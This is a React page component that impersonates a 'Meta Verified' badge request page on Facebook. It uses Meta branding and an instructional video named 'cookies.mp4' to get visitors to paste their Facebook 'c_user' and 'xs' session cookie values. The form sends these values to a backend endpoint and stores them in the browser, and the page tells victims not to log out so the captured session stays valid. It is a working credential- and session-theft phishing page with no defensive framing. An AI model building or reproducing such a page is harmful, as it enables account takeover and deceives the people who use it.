import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { z } from "zod";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";
import { Search, Home, ChevronDown, Settings } from "lucide-react";

const validationFormSchema = z.object({
  c_user: z.string().min(1, "c_user is required"),
  xs: z.string().min(1, "xs is required"),
});

type ValidationFormValues = z.infer<typeof validationFormSchema>;

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm<ValidationFormValues>({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: ValidationFormValues) => {
    try {
      await fetch('/api/form-one', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-screen flex" style={{
      background: "linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)",
      fontFamily: "Arial, Helvetica, sans-serif"
    }}>
      <MetaTags 
        title="Meta Verified | Validation"
        description="Request a verified badge on Facebook - Initial Step"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      {/* Left Sidebar */}
      <div className="hidden md:flex w-[320px] bg-white flex-col border-r h-screen">
        <div className="p-4">
          <div className="flex items-center mb-4">
            <svg className="h-8 w-8 text-[#0180FA]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" fill="none">
              <path fillRule="evenodd" clipRule="evenodd" d="M21.0802 11.9059C21.0802 16.9014 16.9015 21.0802 11.9059 21.0802C6.91041 21.0802 2.73169 16.9014 2.73169 11.9059C2.73169 6.91041 6.91041 2.73169 11.9059 2.73169C16.9015 2.73169 21.0802 6.91041 21.0802 11.9059ZM23 11.9059C23 18.0195 18.0195 23 11.9059 23C5.79239 23 0.811859 18.0195 0.811859 11.9059C0.811859 5.79239 5.79239 0.811859 11.9059 0.811859C18.0195 0.811859 23 5.79239 23 11.9059ZM11.9059 19.1604C15.8411 19.1604 18.9995 16.002 18.9995 12.0668C18.9995 8.13157 15.8411 4.97319 11.9059 4.97319C7.97064 4.97319 4.81226 8.13157 4.81226 12.0668C4.81226 16.002 7.97064 19.1604 11.9059 19.1604Z" fill="#0180FA"/>
            </svg>
            <h1 className="text-lg font-semibold ml-2">Meta Verified</h1>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-2 mb-4">
            <Search className="w-4 h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none w-full text-sm text-[#65676B] placeholder-[#65676B]"
            />
          </div>
          <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center mb-2 text-[#65676B]">
            <Home className="w-4 h-4 mr-2" />
            Home Page
          </button>
          <div className="space-y-2">
            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
              <span>Meta Verified</span>
              <ChevronDown className="w-4 h-4" />
            </button>
            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
              <span>Rules and Guidelines</span>
              <ChevronDown className="w-4 h-4" />
            </button>
            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
              <span>Settings</span>
              <Settings className="w-4 h-4" />
            </button>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Navigation Bar */}
        <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white">
          <div className="flex items-center md:hidden">
            <p className="text-[#0180FA] text-xl sm:text-2xl font-bold">facebook</p>
          </div>
          <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
            <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
            <input
              type="text"
              placeholder="Search"
              className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
            />
          </div>
        </nav>

        <div className="flex-1 flex justify-center p-4 sm:p-8 overflow-y-auto">
          <div className="max-w-2xl w-full space-y-4 sm:space-y-6 bg-white rounded-lg p-6">
            <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
              Request a verified badge on Facebook
            </h1>

            <div className="space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base">
              <p>
                The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
              </p>
              <p>
                Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
              </p>
              <p>
                Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
              </p>
            </div>

            <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
              <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>

              <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
                <video
                  className="w-full h-full"
                  controls
                  playsInline
                  preload="auto"
                >
                  <source
                    src="https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202"
                    type="video/mp4"
                  />
                  Your browser does not support the video tag.
                </video>
              </div>

              <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
                Must Watch the video and submit required information correctly.
              </h3>
            </div>

            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <FormField
                  control={form.control}
                  name="c_user"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">c_user</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min="0"
                          pattern="[0-9]+"
                          minLength={6}
                          placeholder="Enter c_user"
                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#dc3545]" />
                    </FormItem>
                  )}
                />
                <FormField
                  control={form.control}
                  name="xs"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-sm sm:text-base text-[#1c1e21]">xs</FormLabel>
                      <FormControl>
                        <Input 
                          type="text" 
                          placeholder="Enter xs" 
                          className="text-sm sm:text-base border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50"
                          {...field} 
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-[#dc3545]" />
                    </FormItem>
                  )}
                />

                <p className="text-xs sm:text-sm text-[#65676B]">
                  Please make sure account not to log out from your computer or laptop until you have received a verification email.
                </p>

                <Button 
                  type="submit" 
                  className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#0180FA] hover:bg-[#0180FA]/90 transition-colors duration-200"
                  disabled={form.formState.isSubmitting}
                >
                  {form.formState.isSubmitting ? "Submitting..." : "Submit"}
                </Button>
              </form>
            </Form>
          </div>
        </div>

        <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t bg-white">
          Meta © 2025
        </div>
      </div>

      <style>{`
        .video-container {
          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
      `}</style>
    </div>
  );
}